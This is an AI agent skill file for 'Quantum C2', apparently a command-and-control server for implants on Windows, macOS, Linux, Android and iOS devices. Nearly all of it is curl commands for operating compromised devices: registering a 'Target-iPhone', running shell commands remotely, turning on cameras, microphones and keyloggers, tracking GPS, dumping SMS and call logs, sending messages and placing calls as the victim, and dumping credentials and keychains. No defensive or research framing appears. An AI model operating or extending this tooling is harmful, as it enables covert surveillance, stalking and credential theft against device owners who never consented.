---
name: quantum-c2-devices
description: >
  Device control operations for Quantum C2. Use when the user needs to manage connected devices, execute commands on devices, capture screenshots, activate cameras/microphones, or control implants. Triggers on: "device control", "control device", "device command", "camera", "microphone", "screenshot device", "GPS", "device management", "implant control".
---

# Quantum C2 Device Control Skill

Manage and control connected devices.

## Device Registry

### List All Devices
```bash
curl -H "Authorization: Bearer $C2_TOKEN" http://localhost:8000/api/devices/
```

### Register Device
```bash
curl -X POST http://localhost:8000/api/devices/ \
  -H "Authorization: Bearer $C2_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "device_name": "Target-iPhone",
    "device_type": "ios",
    "ip_address": "192.168.1.100",
    "os_version": "17.5",
    "architecture": "arm64"
  }'
```

### Get Device Details
```bash
curl -H "Authorization: Bearer $C2_TOKEN" http://localhost:8000/api/devices/{device_id}
```

### Terminate Device
```bash
curl -X POST http://localhost:8000/api/devices/{id}/terminate \
  -H "Authorization: Bearer $C2_TOKEN"
```

## Device Types & Features

| Type | Features |
|------|----------|
| `windows` | file_system, registry, processes, screenshare, keylogger, webcam, microphone, clipboard, credential_dump |
| `macos` | file_system, keychain, processes, screenshare, keylogger, webcam, microphone, clipboard |
| `linux` | file_system, processes, screenshare, keylogger, webcam, microphone, clipboard |
| `android` | file_system, sms, contacts, call_log, gps, microphone, camera, keylogger, notifications |
| `ios` | file_system, contacts, sms, calls, gps, microphone, camera, keychain, notifications |

## Command Execution

### Execute Command
```bash
curl -X POST http://localhost:8000/api/devices/{id}/command \
  -H "Authorization: Bearer $C2_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"command":"ls -la /tmp"}'
```

### Common Commands
```bash
# List files
curl -X POST http://localhost:8000/api/devices/{id}/command \
  -H "Authorization: Bearer $C2_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"command":"ls -la"}'

# Process list
curl -X POST http://localhost:8000/api/devices/{id}/command \
  -H "Authorization: Bearer $C2_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"command":"ps aux"}'

# System info
curl -X POST http://localhost:8000/api/devices/{id}/command \
  -H "Authorization: Bearer $C2_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"command":"uname -a; whoami; id"}'
```

## Surveillance

### Screenshot
```bash
curl -X POST http://localhost:8000/api/devices/{id}/screenshot \
  -H "Authorization: Bearer $C2_TOKEN"
```

### Camera
```bash
curl -X POST http://localhost:8000/api/devices/{id}/command \
  -H "Authorization: Bearer $C2_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"command":"camera","camera":"front"}'
```

### Microphone
```bash
curl -X POST http://localhost:8000/api/devices/{id}/command \
  -H "Authorization: Bearer $C2_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"command":"microphone"}'
```

### GPS Location
```bash
curl -X POST http://localhost:8000/api/devices/{id}/gps \
  -H "Authorization: Bearer $C2_TOKEN"
```

### Keylogger
```bash
# Enable
curl -X POST http://localhost:8000/api/devices/{id}/keylogger/enable \
  -H "Authorization: Bearer $C2_TOKEN"

# Disable
curl -X POST http://localhost:8000/api/devices/{id}/keylogger/disable \
  -H "Authorization: Bearer $C2_TOKEN"
```

## Communication Control

### SMS Dump
```bash
curl -X POST http://localhost:8000/api/devices/{id}/command \
  -H "Authorization: Bearer $C2_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"command":"sms_dump"}'
```

### Call Log
```bash
curl -X POST http://localhost:8000/api/devices/{id}/command \
  -H "Authorization: Bearer $C2_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"command":"call_log"}'
```

### Send SMS
```bash
curl -X POST http://localhost:8000/api/devices/{id}/command \
  -H "Authorization: Bearer $C2_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"command":"send_sms","number":"+1234567890","message":"Hello"}'
```

### Make Call
```bash
curl -X POST http://localhost:8000/api/devices/{id}/command \
  -H "Authorization: Bearer $C2_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"command":"make_call","number":"+1234567890"}'
```

## App & Website Blocking

### Block App
```bash
curl -X POST http://localhost:8000/api/devices/{id}/command \
  -H "Authorization: Bearer $C2_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"command":"block_app","app_name":"Telegram"}'
```

### Block Website
```bash
curl -X POST http://localhost:8000/api/devices/{id}/command \
  -H "Authorization: Bearer $C2_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"command":"block_website","url":"example.com"}'
```

## Real-Time WebSocket

```
ws://localhost:8000/api/devices/ws/{device_id}
```

## Device Commands Reference

| Command | Parameters | Description |
|---------|------------|-------------|
| `ls` / `dir` | `path` | List files |
| `ps` | — | List processes |
| `whoami` | — | Current user |
| `pwd` | — | Working directory |
| `uname` | — | System info |
| `ifconfig` | — | Network info |
| `cat` | `path` | Read file |
| `grep` | `pattern` | Search files |
| `kill` | `pid` | Kill process |
| `upload` | `path`, `data` | Upload file |
| `download` | `path` | Download file |
| `screenshot` | — | Capture screen |
| `keylog` | `action` | Keylogger control |
